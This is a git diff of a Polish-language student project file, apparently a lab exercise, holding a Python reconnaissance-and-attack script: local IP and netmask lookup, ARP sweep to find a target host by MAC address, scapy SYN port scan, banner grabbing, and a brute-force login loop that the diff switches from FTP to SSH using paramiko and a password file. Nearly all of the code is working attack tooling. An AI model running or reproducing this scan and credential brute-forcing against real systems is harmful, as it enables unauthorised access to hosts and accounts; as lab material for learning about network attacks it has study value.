@@ -51,8 +51,9 @@ Załączniki w postaci screenshotów:
 
 # KOD
 
-################################ 1 - GET LOCAL IP ADDRESS ################################
+######################## 1 - GET LOCAL IP ADDRESS ################################
 
+print("1", "\n")
 import socket
 
 def get_local_ip():
@@ -67,20 +68,19 @@ def get_local_ip():
     return IP
 
 local_ip = get_local_ip()
-print(local_ip)
+print("My local IP: ", local_ip)
 
-################################ 2 - GET MASK ADDRESS ################################
+##################################### 2 - GET MASK ADDRESS #####################################
 
+print("2", "\n")
 from pyroute2 import IPRoute
+
 ip = IPRoute()
 info = [{'iface': x['index'], 'addr': x.get_attr('IFA_ADDRESS'), 'mask':  x['prefixlen']} for x in ip.get_addr()]
-
-print(info)
 a = info[1]
 
 for k, v in a.items():
     if k == 'mask':
-        print(v)
         break
 masks = {0:'0.0.0.0', 1:'128.0.0.0', 2:'192.0.0.0', 3:'224.0.0.0', 4:'240.0.0.0', 5:'248.0.0.0', 6:'252.0.0.0', 7:'254.0.0.0', 8:'255.0.0.0', 9:'255.128.0.0', 10:'255.192.0.0', 11:'255.224.0.0', 12:'255.240.0.0', 13:'255.248.0.0', 14:'255.252.0.0', 15:'255.254.0.0', 16:'255.255.0.0', 17:'255.255.128.0', 18:'255.255.192.0', 19:'255.255.224.0', 20:'255.255.240.0', 21:'255.255.248.0', 22:'255.255.252.0', 23:'255.255.254.0', 24:'255.255.255.0', 25:'255.255.255.128', 26:'255.255.255.192', 27:'255.255.255.224', 28:'255.255.255.240', 29:'255.255.255.248', 30:'255.255.255.252', 31:'255.255.255.254', 32:'255.255.255.255'}
 
@@ -88,11 +88,11 @@ for index, mask in masks.items():
 
     if index == v:
         index == mask
-        print("netmask: ", mask)
+        print("My local netmask: ", mask)
         break
 
-################################ 3 - Looking for target IP ################################
-
+####################################### 3 - Looking for target IP ########################################
+print("3", "\n")
 
 from scapy.all import *
 from scapy.layers.inet import IP, TCP, Ether
@@ -105,29 +105,29 @@ for i in range(100, 105):
     target_MAC = '08:00:27:89:f6:2e'
 
     if dane:
-        print("adres IP: {}, adres MAC: {}".format(str(dane.psrc), str(dane.hwsrc)))
+        # print("adres IP: {}, adres MAC: {}".format(str(dane.psrc), str(dane.hwsrc)))
         if target_MAC == dane.hwsrc:
             print("Target IP: ", str(dane.psrc))
             target_IP = dane.psrc
 
-################################ 4 - Ports scaning ################################
-
+################################## 4 - Ports scaning #####################################
+print("4", "\n")
 cel = target_IP
 pakiet = IP(dst="google.com")/ICMP()/"Projekt"
-for port in range(22):
+for port in range(21, 23):
     pakiet = IP(dst=cel)/TCP(dport=[port], flags = "S")
-    rec, wrong = sr(pakiet, timeout=1, verbose=0)
-    print(rec)
-    
+    rec, wrong = sr(pakiet, timeout=1, verbose=0) #timeout - dlugosc zycia, verbose - ilosc wyswietlanych inf zwrotnych 0 - 3
+
     if rec:
         usluga = "{}".format(str(str(rec[0]).split(" ")[7][6:]))
         dane = f"Port: {port} otwarty, usluga = {usluga}"
         print(dane)
     else:
-        print(f"{port} Port zablokowany")
+        continue
 
-################################ 5 - Banner Grabbing ################################
 
+################################## 5 - Banner Grabbing #####################################
+print("5", "\n")
 import socket
 import sys
 
@@ -135,7 +135,7 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 target = target_IP
 
-for port in range(1, 65000):
+for port in range(21, 23):
     try:
         connection = s.connect((target, port))
         print(f"[+] {target}: port {port} is OPEN")
@@ -143,24 +143,31 @@ for port in range(1, 65000):
         response = s.recv((2048)).decode()
         print("Name and version service: ", response)
     except:
+#        print(f"[-] {target}: port {port} is CLOSED")
         pass
 
-################################ 6 - Brute Force ################################
+############################################ 6 - Brute Force ########################################
+print("6", "\n")
+import paramiko
 
-import ftplib
-users = open("usernames.txt", "r")
-passwords = open("passlist.txt", "r")
+with open('correctpasses.txt') as f:
+    users = f.read().splitlines()
 
 target = target_IP
-for user in users:
-    for password in passwords:
-        print(f"Trying> {user}:{password}")
+ssh_server = paramiko.SSHClient()
+ssh_server.set_missing_host_key_policy(paramiko.AutoAddPolicy)
+ssh_server.load_system_host_keys()
+port = 22
+print("program in progress")
 
+for user in users:
+    for password in users:
         try:
-            ftp_server = ftplib.FTP()
-            ftp_server.connect(target, 21, timeout=2)
-            ftp_server.login(user, password)
-            print("[+] Login successful.")
-            ftp_server.close()
+            #print(f"[*] Trying> {user}:{password}", end="")
+            ssh_server.connect(target, port, user, password)
+            print(f" - SUCCESS")
+            print(f"Correct login and password: > {user}:{password}")
+            ssh_server.close()
         except Exception as exc:
-            print("[-] Brute-force attack failed!")
+            # print("[-] Brute-force attack failed!")
+            pass
